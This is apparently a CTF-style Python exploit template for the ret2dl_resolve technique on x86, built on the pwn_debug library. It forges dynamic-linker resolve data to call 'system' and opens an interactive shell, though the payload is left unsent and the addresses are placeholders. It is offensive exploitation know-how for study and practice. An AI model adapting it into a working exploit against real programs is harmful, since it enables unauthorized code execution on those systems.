# File: ret2dl_resolve_x86.py
# Author: raycp
# Date: 2019-05-31
# Description: template for ret2dl_resolve in x86 architecture

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():
    
    #pdbg.bp([])
    base_addr=0x0
    ret2dl_resolve=pdbg.ret2dl_resolve()

    addr,resolve_data,resovle_call=ret2dl_resolve.build_normal_resolve(base_addr,'system',base_addr+0x400)
    #def build_normal_resolve(self,base,function_name, resolve_target)
        #return evil_addr,resolve_data,resovle_call

    
   

    
    p.interactive() 

if __name__ == '__main__':
    pwn()


